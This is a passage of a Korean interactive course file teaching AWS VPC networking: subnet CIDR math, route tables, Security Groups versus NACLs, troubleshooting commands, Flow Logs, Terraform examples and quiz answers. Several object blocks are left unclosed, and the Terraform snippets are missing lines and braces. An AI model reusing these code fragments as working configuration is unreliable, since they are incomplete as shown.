      ctl: [{ k: 'c', type: 'text', label: '서브넷 CIDR', w: 160 }, { k: 'vpc', type: 'text', label: 'VPC CIDR', w: 160 }, { type: 'btns', items: ['10.0.1.0/24', '10.0.1.0/26', '10.0.1.0/28', '10.0.20.0/24', '10.0.0.0/23'].map(v => ({ label: v, act: st => st.c = v })) }],
      out: st => { const c = parseCIDR(st.c), v = parseCIDR(st.vpc); if (!c) return '<span class="err">CIDR 형식: a.b.c.d/n</span>';
        if (c.p < 16 || c.p > 28) return `<div class="verdict bad">AWS 서브넷은 /16 ~ /28만 가능</div>`;
        const n = IP.total(c.p), base = c.net, bc = IP.bc(c.net, c.p);
        const inside = v && inCIDR(c.net, v) && c.p >= v.p;
        const rows = [[IP.str(base), '네트워크 주소'], [IP.str(base + 1), 'VPC 라우터 (기본 게이트웨이 .1)'], [IP.str(base + 2), 'DNS 예약 — 실제 VPC DNS는 VPC CIDR +2' + (v ? ` = <b>${IP.str(v.net + 2)}</b>` : '')], [IP.str(base + 3), '향후 예약'], [`${IP.str(base + 4)} ~ ${IP.str(bc - 1)}`, `<b class="cok">사용 가능 ${fmt(n - 5)}개</b>`], [IP.str(bc), '브로드캐스트 (VPC는 브로드캐스트를 지원하지 않지만 예약)']];
        return T(['주소', '용도'], rows, { mono: [0] }) + `<div class="verdict ${inside ? 'ok' : 'bad'}">${fmt(n)} − 5 = 사용 가능 ${fmt(n - 5)}개${inside ? '' : ' · ⚠ VPC CIDR 범위 밖'}</div>` +
          (v && inside ? `<p style="margin:0">이 VPC(/${v.p}) 안에 /${c.p} 서브넷은 2^(${c.p}−${v.p}) = <b>${fmt(2 ** (c.p - v.p))}개</b> 들어간다. 2주차와 달리 클라우드 서브넷은 <b>5개</b> 빠진다 (네트워크 + 브로드캐스트 2개가 아니라).</p>` : ''); } } },
    T(['문제', '풀이', '답'], [['/24 서브넷의 사용 가능 IP', '256 − 5', '<b>251</b>'], ['/26 서브넷의 사용 가능 IP', '64 − 5', '<b>59</b>'], ['/28 서브넷의 사용 가능 IP', '16 − 5', '<b>11</b>'], ['/16 VPC를 /24로 나누면 몇 개?', '2^(24−16)', '256개'], ['10.0.20.0/24의 VPC DNS 주소', 'VPC CIDR +2', '10.0.0.2'], ['컨테이너 300개가 들어갈 서브넷', '300 + 5 > 256', '/23 이상']]),
    T(['사설 IP 대역 (RFC 1918)', '크기', '비고'], [['10.0.0.0/8', '1,677만 개', '대규모 · 클라우드 VPC에 가장 흔함'], ['172.16.0.0/12', '104만 개', 'AWS Default VPC 172.31.0.0/16이 여기'], ['192.168.0.0/16', '6.5만 개', '가정 · 연구실 공유기 (<b>겹치기 쉬움!</b>)']], { mono: [0] }),
    H.warn('자주 하는 실수: 서브넷 /28로 시작 → 오토스케일링 · 컨테이너가 늘자 <b>IP 고갈</b>로 배포 실패 · VPC DNS는 각 서브넷의 +2가 아니라 <b>VPC CIDR의 +2</b>(10.0.0.2) · EKS는 Pod마다 VPC IP를 써서 /24가 금방 찬다 → /20 이상.'),
  ] },

{ id: 'w9.plan', title: 'VPC CIDR 계획 — 실제 설계표', slides: 'S13',
  blocks: [
    T(['서브넷', 'AZ', 'CIDR', '용도', '가용 IP'], [['public-a', 'a', '10.0.0.0/24', 'ALB · NAT GW', '251'], ['public-c', 'c', '10.0.1.0/24', 'ALB · NAT GW', '251'], ['app-a', 'a', '10.0.10.0/24', 'API 서버 · 브로커', '251'], ['app-c', 'c', '10.0.11.0/24', 'API 서버 · 브로커', '251'], ['db-a', 'a', '10.0.20.0/24', 'RDS Primary', '251'], ['db-c', 'c', '10.0.21.0/24', 'RDS Standby', '251'], ['(예약)', 'b · d', '10.0.128.0/17', 'AZ 추가 · 새 계층', '—']], { mono: [2] }),
    H.cards([['번호 규칙', '세 번째 옥텟: 0~9 Public, 10~19 App, 20~29 DB · 끝자리 0 = AZ a, 1 = AZ c → <b>주소만 보고 위치를 안다</b>', ''], ['겹치면 안 되는 대상', '연구실 · 학교망(192.168.x) · 다른 VPC(개발/운영/다른 리전) · VPN으로 연결할 집 · 회사 → 겹치면 Peering · VPN 경로를 만들 수 없다 (어느 쪽 10.0.1.5인지 모름)', 'L3'], ['환경별 VPC 분리', 'dev 10.10.0.0/16 · stage 10.20.0.0/16 · prod 10.30.0.0/16<br>→ 나중에 연결해도 충돌 없음 · 두 번째 옥텟만 보고 환경을 안다', 'L7']]),
    H.key('VPC CIDR은 만든 뒤 바꾸기 어렵다(보조 CIDR 추가는 가능하지만 제약 많음). 처음에 <b>넉넉하게 · 겹치지 않게</b> 잡는 것이 가장 싼 설계 결정이다.'),
    H.warn('AI에게 CIDR을 맡기면 10.0.0.0/16 하나로 모든 환경을 만드는 실수를 자주 한다.'),
  ] },

{ id: 'w9.route', title: 'Subnet과 Route Table — Public/Private는 이름이 아니라 경로가 정한다', slides: 'S14–S15',
  blocks: [
    `<div class="pair"><div><h4>Subnet의 규칙</h4>${lines(['하나의 AZ에만 속한다 (AZ 장애 = 그 서브넷 장애)', 'VPC CIDR 안에서 서로 겹치지 않는다', 'Route Table 1개와 연결 (지정 안 하면 <b>Main RT</b>)', 'NACL 1개와 연결'])}</div><div><h4>Route Table = 목적지 → 다음 홉</h4>${lines(['<b>local</b> 경로는 자동 생성 · 삭제 불가 → VPC 내부 통신', '목적지 IP와 가장 길게 일치하는 경로 (Longest Prefix Match)', '0.0.0.0/0 = 기본 경로 — 나머지 전부'])}</div></div>`,
    `<div class="pair"><div><h4 class="cok">public-rt <small class="cm">(public-a · public-c)</small></h4>${T(['Destination', 'Target', '의미'], [['10.0.0.0/16', 'local', 'VPC 안은 직접'], ['0.0.0.0/0', '<b>igw-0a1b…</b>', '나머지는 인터넷 정문으로']], { mono: [0, 1] })}</div><div><h4>private-rt-a <small class="cm">(app-a · db-a)</small></h4>${T(['Destination', 'Target', '의미'], [['10.0.0.0/16', 'local', 'VPC 안은 직접'], ['0.0.0.0/0', '<b>nat-0c3d…</b> (AZ a)', '나가는 것만 NAT로'], ['pl-s3', 'vpce-…', 'S3는 Endpoint로']], { mono: [0, 1] })}</div></div>`,
    H.key('“public-subnet”이라는 이름표는 아무 의미가 없다. <b>0.0.0.0/0 → IGW 경로가 있으면 Public, 없으면 Private</b> — 콘솔에서 항상 Route Table 탭을 확인. db 서브넷은 외부 호출이 필요 없으면 0.0.0.0/0 행 자체를 두지 않는다 → <b>Isolated subnet</b>.'),
    { h3: '경로 고르기 연습 — Longest Prefix Match (S15)' },
    { lab: { title: 'app-a 서버가 이 목적지로 보내면 어느 경로를 탈까?', init: { d: '172.16.5.4' },
      ctl: [{ k: 'd', type: 'text', label: '목적지 IP', w: 150 }, { type: 'btns', items: ['10.0.20.15', '8.8.8.8', '172.16.9.4', '172.16.5.4', '10.1.0.7'].map(v => ({ label: v, act: st => st.d = v })) }],
      out: st => { const a = IP.parse(st.d); if (a == null) return '<span class="err">IPv4 주소를 입력</span>';
        const m = RT.map(r => ({ r, c: parseCIDR(r[1]) })).filter(x => inCIDR(a, x.c)); const best = m.reduce((b, x) => !b || x.c.p > b.c.p ? x : b, null);
        return T(['#', 'Destination', 'Target', '일치?'], RT.map(r => { const hit = m.find(x => x.r === r); return [r[0], r[1], r[2], hit ? (hit === best ? `<b class="cok">✓ 선택 (/${hit.c.p} 가장 김)</b>` : `✓ /${hit.c.p}`) : '—']; }), { mono: [1], hl: r => best && r[0] === best.r[0] }) +
          `<div class="verdict ${best.r[0] === '④' && a >>> 24 === 10 ? 'bad' : 'ok'}">${best.r[0]} → ${best.r[3]}</div>` +
          (st.d.trim() === '10.1.0.7' || (best.r[0] === '④' && a >>> 24 === 10) ? `<p style="margin:0" class="cbad">함정! 10.1.0.0/16은 다른 VPC인데 경로가 없어 기본 경로(NAT)로 나간다 → 인터넷으로 나가서 실패. “경로가 없다”가 아니라 <b>“엉뚱한 경로가 있다”</b>가 진짜 원인인 경우가 많다.</p>` : `<p style="margin:0">일치하는 경로를 모두 고른 뒤 접두사(/ 뒤 숫자)가 <b>가장 긴</b> 것을 선택. 0.0.0.0/0은 길이 0 → 항상 마지막 후보. 2주차 라우팅과 100% 같다.</p>`); } } },
    H.warn('라우팅 테이블에서 목적지가 여러 행에 해당하면 <b>더 구체적인(긴) 경로가 우선</b>한다 — 0.0.0.0/0처럼 넓은 경로가 우선한다는 것은 틀린 말.'),
  ] },

{ id: 'w9.public', title: 'Public Subnet의 3가지 조건 · Internet Gateway (1:1 변환)', slides: 'S16–S17',
  blocks: [
    { lab: { title: '“Public 서브넷인데 접속이 안 돼요” — 하나라도 빠지면', init: { rt: true, pip: false, sg: true, nacl: true, bind: true },
      ctl: [{ k: 'rt', type: 'toggle', label: '① 경로: RT에 0.0.0.0/0 → IGW' }, { k: 'pip', type: 'toggle', label: '② 공인 IP: Public IPv4 / EIP' }, { k: 'sg', type: 'toggle', label: '③ 문: SG 443 from 0.0.0.0/0' }, { k: 'nacl', type: 'toggle', label: '③ 문: NACL 허용' }, { k: 'bind', type: 'toggle', label: '앱이 0.0.0.0:443에서 listen' }],
      out: st => { let v;
        if (!st.rt) v = ['bad', '타임아웃', 'IGW 경로가 없다 → VPC 밖으로 나갈 길 자체가 없다 (응답도 못 나감).'];
        else if (!st.pip) v = ['bad', '접속할 주소가 없다', '사설 IP만 있으면 IGW가 변환해 줄 주소가 없다 → DNS에 등록할 공인 IP 자체가 없음.'];
        else if (!st.sg || !st.nacl) v = ['bad', '타임아웃', '길과 주소가 있어도 문이 닫혀 있으면 패킷이 조용히 버려진다.'];
        else if (!st.bind) v = ['bad', 'Connection refused', '길 · 문은 열림 — 서버까지 도착했지만 듣는 프로세스가 없다 (127.0.0.1 바인딩 등).'];
        else v = ['ok', '200 OK', '경로 + 공인 IP + 문 + 리스너 모두 OK.'];
        return `<div class="verdict ${v[0]}">${v[1]}</div><p style="margin:0">${v[2]}</p>`; } } },

{ id: 'w9.state', title: 'Stateful vs Stateless — 도어락과 경비원 · NACL 규칙', slides: 'S22–S23',
  blocks: [
    `<div class="pair"><div><h4>Security Group = 똑똑한 도어락 (Stateful)</h4>${lines(['손님(요청)이 들어올 때 명단 확인', '들어온 손님이 나갈 때(응답)는 <b>기억</b>하고 있어 그냥 열어 준다', '→ 인바운드 443만 허용하면 응답은 자동 통과'])}</div><div><h4>NACL = 기억 못 하는 경비원 (Stateless)</h4>${lines(['들어오는 사람 · 나가는 사람을 <b>각각 따로</b> 명부와 대조', '방금 들어간 손님이 나와도 처음 보는 사람 취급', '→ 응답이 나가는 <b>임시 포트(1024–65535) 아웃바운드도</b> 허용해야'])}</div></div>`,
    { lab: { title: '같은 HTTPS 요청 하나가 SG와 NACL을 지날 때', init: { sgin: true, nin: true, nout: false },
      ctl: [{ k: 'sgin', type: 'toggle', label: 'SG 인바운드 443 허용' }, { k: 'nin', type: 'toggle', label: 'NACL 인바운드 443 허용' }, { k: 'nout', type: 'toggle', label: 'NACL 아웃바운드 1024–65535 허용' }],
      out: st => { const reqOK = st.nin && st.sgin, resOK = reqOK && st.nout;
        const rows = [['203.0.113.50:50123 → 10.0.0.30:443 (요청)', '인바운드', st.sgin ? '443 허용 → <b class="cok">통과</b>, 연결 기억' : '<b class="cbad">차단</b>', st.nin ? '443 허용? → <b class="cok">통과</b>' : '<b class="cbad">차단</b>'], ['10.0.0.30:443 → 203.0.113.50:50123 (응답)', '아웃바운드', reqOK ? '기억된 연결의 응답 → <b class="cok">자동 통과</b>' : '—', reqOK ? (st.nout ? '50123번 허용? → <b class="cok">통과</b>' : '<b class="cbad">50123번 규칙 없음 → 차단!</b>') : '—']];
        return T(['패킷', '방향', 'SG 검사', 'NACL 검사'], rows, { mono: [0] }) + `<div class="verdict ${resOK ? 'ok' : 'bad'}">${resOK ? '200 OK' : '타임아웃'}</div><p style="margin:0">${resOK ? 'SG는 응답을 기억해 통과시키고, NACL은 아웃바운드 임시 포트 규칙으로 통과.' : reqOK ? '<b>가장 흔한 사고</b> — 요청은 들어오는데(Flow Logs 인바운드 ACCEPT) 응답이 못 나가 타임아웃만 보인다. Custom NACL에 아웃바운드 임시 포트를 빠뜨렸다.' : '요청 단계에서 막혔다.'}</p>`; } } },
    H.note('임시 포트(Ephemeral port): 클라이언트 OS가 연결마다 임의로 고르는 출발 포트 (3주차의 소켓). 리눅스 기본 32768–60999, NACL에는 보통 1024–65535를 연다.'),
    { h3: 'Network ACL — 번호가 작은 것부터, 처음 일치한 규칙으로 (S23)' },
    { lab: { title: 'NACL 인바운드 평가기', init: { src: '198.51.100.7', port: '443' },
      ctl: [{ k: 'src', type: 'text', label: '출발지 IP', w: 150 }, { k: 'port', type: 'text', label: '목적지 포트', w: 80 }, { type: 'btns', items: [['198.51.100.7', '443'], ['203.0.113.9', '443'], ['203.0.113.9', '22'], ['104.18.1.1', '61001']].map(([a, b]) => ({ label: `${a}:${b}`, act: st => { st.src = a; st.port = b; } })) }],
      out: st => { const a = IP.parse(st.src), p = +st.port; if (a == null || !(p >= 0)) return '<span class="err">IP와 포트를 확인</span>'; let hit = -1;
        NACL_IN.forEach((r, i) => { if (hit < 0 && portIn(r[1], p) && inCIDR(a, parseCIDR(r[2]))) hit = i; });
        return T(['Rule #', 'Port', 'Source', 'Allow/Deny', '평가'], NACL_IN.map((r, i) => [String(r[0]), r[1], r[2], r[3] === 'DENY' ? `<b class="cbad">${r[3]}</b>` : `<b class="cok">${r[3]}</b>`, i < hit ? '불일치 → 다음' : i === hit ? '<b>← 첫 일치, 여기서 결정</b>' : '(검사 안 함)']), { mono: [0, 1, 2], hl: (r, i) => i === hit }) +
          `<div class="verdict ${NACL_IN[hit][3] === 'ALLOW' ? 'ok' : 'bad'}">${NACL_IN[hit][3]}${NACL_IN[hit][4] ? ' — ' + NACL_IN[hit][4] : ''}</div>${hit === 0 && p === 443 ? '<p style="margin:0">#90이 먼저 검사되므로 이 대역의 443 요청은 #100에 닿기 전에 거부된다. 번호를 10 간격으로 두면 사이에 끼워 넣기 쉽다.</p>' : ''}`; } } },
    H.cards([['기본값', '<b>Default NACL: 모두 허용</b> (그래서 보통 SG만 신경 씀)<br>새로 만든 <b>Custom NACL: 모두 거부</b>에서 시작', ''], ['언제 쓰나', '특정 IP 대역 차단(Deny), 서브넷 단위의 굵은 경계 · 규정 준수. 세밀한 허용은 SG로.', 'L3']]),
  ] },

{ id: 'w9.sgnacl', title: 'SG vs NACL — 다층 방어 · SG Chaining 3-tier', slides: 'S24–S25',
  blocks: [
    T(['항목', 'Security Group', 'Network ACL'], [['적용 단위', '<b>ENI</b> (인스턴스 · LB · RDS)', '<b>Subnet</b>'], ['상태', '<b>Stateful</b> — 응답 자동 허용', '<b>Stateless</b> — 양방향 각각'], ['규칙 종류', 'Allow만', 'Allow + Deny'], ['평가', '모든 규칙 OR', '번호 순 · 첫 일치'], ['Source 지정', 'CIDR · 다른 SG · prefix list', 'CIDR만'], ['기본값', '인바운드 거부 · 아웃바운드 허용', 'Default: 모두 허용'], ['주 용도', '세밀한 서비스 간 허용', '대역 차단 · 굵은 경계']]),

{ id: 'w9.trouble', title: 'Common Failure Modes · 바깥에서 안쪽으로 한 겹씩', slides: 'S37–S38',
  blocks: [
    T(['증상', '흔한 원인', '확인 위치'], [['Public 서버인데 브라우저에서 타임아웃', 'IGW 경로 없음 · 공인 IP 없음 · SG 443 미허용', 'Route Table → Public IP → SG'], ['Private 서버에서 pip install / apt 실패', 'NAT 경로 없음 · <b>NAT GW가 Private 서브넷에 있음</b>', 'private-rt의 0.0.0.0/0 · NAT의 서브넷'], ['요청은 들어오는데 응답이 안 감 (타임아웃)', 'Custom NACL에 아웃바운드 임시 포트 누락', 'NACL Outbound 1024–65535'], ['Connection refused (즉시 실패)', '길 · 문은 열림, 앱이 포트를 안 듣거나 127.0.0.1 바인딩', '서버에서 ss -ltnp (3주차)'], ['ALB 502 / 503', '대상 Health check 실패 · app-sg가 alb-sg 미허용', 'Target Group 상태 · SG 참조'], ['DB 연결 타임아웃', 'db-sg Source가 app-sg가 아님 · 다른 VPC/서브넷', 'db-sg Inbound · Flow Logs REJECT'], ['Peering했는데 통신 불가', '양쪽 RT 미추가 · CIDR 겹침 · 3단계 경유(비전이)', '양쪽 RT · CIDR 표'], ['배포 중 IP 부족 오류', '/28 등 작은 서브넷 · 예약 5개 미고려', '서브넷 Available IPv4 수'], ['AZ 하나 장애 시 전체 외부 호출 실패', 'NAT GW를 한 AZ에만 둠', 'AZ별 private-rt 대상 NAT']]),
    H.key('<b>타임아웃 vs Refused</b>가 첫 단서: 타임아웃 = 중간(경로 · SG · NACL)에서 패킷이 사라짐 · Refused = 서버까지 도착했지만 듣는 프로세스가 없음.'),
    { lab: { title: '어느 겹에서 멈췄나 — 증상으로 좁히기', init: { s: 'nctime' },
      ctl: [{ k: 's', type: 'select', label: '관찰', opts: [['dig', 'dig가 공인 IP를 준다'], ['nctime', 'nc -zv db 5432 → 타임아웃'], ['ncref', 'nc -zv api 8000 → refused'], ['ext', 'curl 외부 실패 + 내부 성공'], ['502', 'ALB가 502']] }],
      out: st => { const L = ['DNS', 'Route Table', 'NACL', 'Security Group', 'OS · 리스너', 'Application']; const m = { dig: [0, 'DNS 설정 — VPC 밖 Resolver를 쓰고 있다'], nctime: [3, '경로 · SG · NACL 중 하나 (보통 db-sg Source) — Flow Logs에서 REJECT 확인'], ncref: [4, '리스너 — ss -ltnp로 0.0.0.0:8000 바인딩 확인'], ext: [1, 'NAT 경로 — private-rt의 0.0.0.0/0 → nat, NAT가 Public 서브넷에 있는지'], '502': [5, 'Target Health check · app-sg가 alb-sg 허용하는지'] }[st.s];
        return `<div class="hflow">${L.map((x, i) => `<div class="fl-step" style="${i === m[0] ? 'outline:2px solid var(--bad)' : 'opacity:.6'}"><b>${i + 1}</b><span>${x}</span></div>`).join('<span class="fl-arr">→</span>')}</div><p style="margin:0">${m[1]}</p>`; } } },
    H.pre(`# 서버 안에서 (Session Manager로 접속)
$ curl -sv https://api.openai.com -o /dev/null   # 외부 호출(NAT) 확인
$ nc -zv mydb.abc.rds.amazonaws.com 5432         # DB 포트 도달?
$ dig +short mydb.abc.rds.amazonaws.com          # 사설 IP?
$ ss -ltnp | grep 8000                           # 앱이 듣는 주소
$ ip route                                       # 기본 게이트웨이 = .1`),
    H.note('Reachability Analyzer — 출발지 · 목적지를 지정하면 Route · SG · NACL을 설정만으로 분석해 “어느 규칙에서 막히는지” 알려 준다 (패킷을 보내지 않음).'),
  ] },

{ id: 'w9.flow', title: 'VPC Flow Logs 읽기 — VPC의 “통화 기록”', slides: 'S39',
  blocks: [
    { lab: { title: 'Flow Log 한 줄 해부', init: { l: '2 123456789012 eni-0d4e5f 10.0.10.5 10.0.20.37 51544 5432 6 3 180 1731830400 1731830460 REJECT OK' },
      ctl: [{ k: 'l', type: 'text', label: '로그 (version 2)', w: 560 }, { type: 'btns', items: [{ label: '1번째 줄 (ACCEPT)', act: st => st.l = '2 123456789012 eni-0a1b2c 203.0.113.50 10.0.0.30 50123 443 6 12 3120 1731830400 1731830460 ACCEPT OK' }, { label: '2번째 줄 (REJECT)', act: st => st.l = '2 123456789012 eni-0d4e5f 10.0.10.5 10.0.20.37 51544 5432 6 3 180 1731830400 1731830460 REJECT OK' }] }],
      out: st => { const f = st.l.trim().split(/\s+/); if (f.length < 14) return '<span class="err">필드 14개가 필요하다</span>';
        const proto = { 6: 'TCP', 17: 'UDP', 1: 'ICMP' }[f[7]] || f[7]; const t0 = new Date(+f[10] * 1000), t1 = new Date(+f[11] * 1000);
        const rows = [['version · account · interface', `${f[0]} · ${f[1]} · ${f[2]}`, '어느 ENI(어느 서버)의 기록인가'], ['srcaddr → dstaddr', `${f[3]} → ${f[4]}`, ''], ['srcport → dstport', `${f[5]} → ${f[6]}`, +f[5] >= 1024 ? '임시 포트 → 서비스 포트' : ''], ['protocol', `${f[7]}`, `${proto} (6 = TCP, 17 = UDP, 1 = ICMP)`], ['packets · bytes', `${f[8]} · ${f[9]}`, '집계 구간 동안의 양'], ['start · end', `${f[10]} · ${f[11]}`, `${Math.round((t1 - t0) / 1000)}초 구간 (Unix time)`], ['action', `<b class="${f[12] === 'ACCEPT' ? 'cok' : 'cbad'}">${f[12]}</b>`, 'SG · NACL 판정 결과'], ['log-status', f[13], '']];
        const why = f[12] === 'REJECT' && f[6] === '5432' ? 'API 서버 → DB 5432 REJECT → db-sg 또는 NACL이 막았다. 앱 로그의 “DB timeout”의 진짜 원인.' : f[12] === 'ACCEPT' ? '허용된 연결 — 응답이 안 간다면 반대 방향(아웃바운드) 기록을 찾아본다.' : 'SG · NACL이 막았다.';
        return T(['필드', '값', '의미'], rows, { mono: [1] }) + `<p style="margin:0">${why}</p>`; } } },
    H.warn('SG가 막으면 REJECT로 남지만 <b>Route가 없으면 기록 자체가 없을 수 있다</b> — 없는 것도 단서. Flow Logs에는 <b>패킷 내용(HTTP Body 등)이 없다</b> — 메타데이터(주소 · 포트 · 양 · 판정)만.'),
    H.note('보안 감사에도 쓴다: “DB 포트에 VPC 밖 IP가 접근 시도한 적 있는가?” — CloudWatch Logs · Athena로 쿼리.'),
  ] },

{ id: 'w9.iac', title: 'Infrastructure as Code — VPC와 SG를 코드로', slides: 'S40–S41',
  blocks: [
    `<div class="pair"><div><h4>VPC · Subnet · IGW</h4>${H.pre(`resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"

}
resource "aws_subnet" "public_a" {
  vpc_id                  = aws_vpc.main.id

}
resource "aws_internet_gateway" "igw" {
  vpc_id = aws_vpc.main.id
}`)}</div><div><h4>Route Table — 이것이 “Public”을 만든다</h4>${H.pre(`resource "aws_route_table" "public" {
  vpc_id = aws_vpc.main.id

    cidr_block = "0.0.0.0/0"

resource "aws_route_table_association" "pa" {

}`)}</div></div>`,
    H.key('워크플로: <code>terraform plan</code>(무엇이 바뀌나 미리 보기) → 리뷰 → <code>apply</code> → 실습 끝나면 <code>destroy</code>. subnet 이름이 public_a여도 <b>association이 없으면 Main RT</b>를 쓴다 — 코드 리뷰에서 “이름”이 아니라 route_table_association을 찾아라.'),
    H.pre(`resource "aws_vpc_security_group_ingress_rule" "app_from_alb" {
  security_group_id            = aws_security_group.app.id

}
# terraform plan에서 볼 것
  + resource "aws_vpc_security_group_ingress_rule" "db_from_app" {
      + cidr_ipv4   = "0.0.0.0/0"    ← !!!
      + from_port   = 5432`),
    lines(['0.0.0.0/0이 alb 외 SG의 ingress에 있는가?', 'ip_protocol = "-1"(모든 포트) 인바운드가 있는가?', 'db 규칙의 Source가 app SG 참조인가?', 'egress가 꼭 전체 허용이어야 하는가? (Terraform은 기본 egress를 지운다)']),
    H.warn('plan은 변경 전에 읽는 마지막 기회다. AI가 만든 코드를 apply하기 전에 plan의 + 줄에서 0.0.0.0/0과 22 · 3306 · 5432를 검색하자.'),
  ] },

  { q: 'VPC CIDR을 처음에 신중하게 정해야 하는 이유 두 가지는?', ref: 'w9.plan', model: '① 만든 뒤 <b>바꾸기 어렵다</b>(보조 CIDR 추가도 제약) → 서브넷 · 서버가 늘 자리를 넉넉히. ② 다른 VPC · 연구실 · 회사망과 <b>겹치면 Peering · VPN 경로를 만들 수 없다</b>.', kw: ['변경 어려움 · 확장 여유', '겹치면 Peering/VPN 불가'] },
  { q: '10.0.1.0/26 서브넷에서 AWS가 허용하는 사용 가능 IP 수는?', ref: 'w9.cidr', model: '/26 = 2^(32−26) = 64개. AWS는 서브넷마다 <b>5개를 예약</b>(네트워크 · VPC 라우터 · DNS · 향후 예약 · 브로드캐스트)하므로 <b>64 − 5 = 59개</b>.', kw: ['64개', '5개 예약', '59개'] },
  { q: 'Public Subnet과 Private Subnet을 구분하는 실제 기준은 무엇인가?', ref: 'w9.route', model: '서브넷에 연결된 <b>Route Table에 0.0.0.0/0 → IGW 경로가 있는지</b>. 있으면 Public, 없으면 Private. 이름표는 아무 의미가 없다.', kw: ['Route Table', '0.0.0.0/0 → IGW 유무', '이름 아님'] },
  { q: 'Public 서브넷의 서버가 인터넷과 통신하기 위한 3가지 조건은?', ref: 'w9.public', model: '① <b>경로</b>: RT에 0.0.0.0/0 → IGW ② <b>공인 IP</b>: Public IPv4 또는 Elastic IP ③ <b>문 열기</b>: SG 인바운드(예: 443) + NACL 허용.', kw: ['IGW 경로', '공인 IP (EIP)', 'SG · NACL 허용'] },
  { q: 'Private 서버가 외부 API를 호출할 때 출발지 IP는 어떻게 바뀌는가?', ref: 'w9.nat', model: '10.0.10.5(서버 사설) → <b>NAT GW가 SNAT</b>로 자기 사설 IP:새 포트(10.0.0.8:61001)로 바꾸고 매핑 기록 → <b>IGW가 EIP로 1:1 변환</b>(52.79.1.2). 외부는 NAT의 EIP만 본다. 응답은 거꾸로 두 번 복원된다.', kw: ['NAT GW SNAT (포트 매핑)', 'IGW가 EIP로 1:1', '외부는 EIP만 봄 · 응답은 역변환'] },
  { q: 'Security Group과 NACL의 차이를 Stateful/Stateless로 설명하라.', ref: 'w9.sgnacl', model: '<b>SG</b>는 ENI 단위 <b>Stateful</b> — 허용된 요청의 응답을 기억해 자동 허용, Allow만. <b>NACL</b>은 서브넷 단위 <b>Stateless</b> — 들어오고 나가는 패킷을 각각 따로 검사, Allow · Deny + 번호 순 첫 일치.', kw: ['SG = ENI · Stateful · 응답 자동 허용', 'NACL = 서브넷 · Stateless · 양방향 각각', 'NACL은 Deny · 번호 순'] },
  { q: 'NACL에서 임시 포트(1024–65535)를 열어야 하는 이유는?', ref: 'w9.state', model: 'NACL은 Stateless라 응답을 기억하지 못한다. 서버의 응답은 클라이언트가 고른 <b>임시 포트</b>로 나가므로, 아웃바운드에 그 범위를 허용하지 않으면 요청은 들어와도 <b>응답이 못 나가 타임아웃</b>이 된다.', kw: ['Stateless · 응답 기억 못 함', '응답은 클라이언트 임시 포트로', '누락 시 타임아웃'] },
  { q: 'SG Source에 IP 대신 다른 SG를 지정하면 무엇이 좋은가?', ref: 'w9.sgnacl', model: '“그 SG를 단 모든 인스턴스”를 허용하므로 Auto Scaling · 교체로 <b>서버가 늘거나 IP가 바뀌어도 규칙 수정이 필요 없다</b>. 최소 권한 체인(ALB → API → DB)을 IP 없이 표현해 규칙 자체가 아키텍처 문서가 된다.', kw: ['IP 바뀌어도 규칙 유지', 'Auto Scaling에 강함', '최소 권한 체인'] },
  { q: '“타임아웃”과 “Connection refused”는 각각 어느 계층의 문제를 암시하는가?', ref: 'w9.trouble', model: '<b>타임아웃</b> = 중간(경로 · Route Table · SG · NACL)에서 패킷이 사라졌다. <b>Refused</b> = 서버까지 도착했지만 그 포트를 <b>듣는 프로세스가 없다</b>(앱 미실행 · 127.0.0.1 바인딩).', kw: ['타임아웃 = 경로·SG·NACL', 'Refused = 리스너/앱'] },
] };
})();
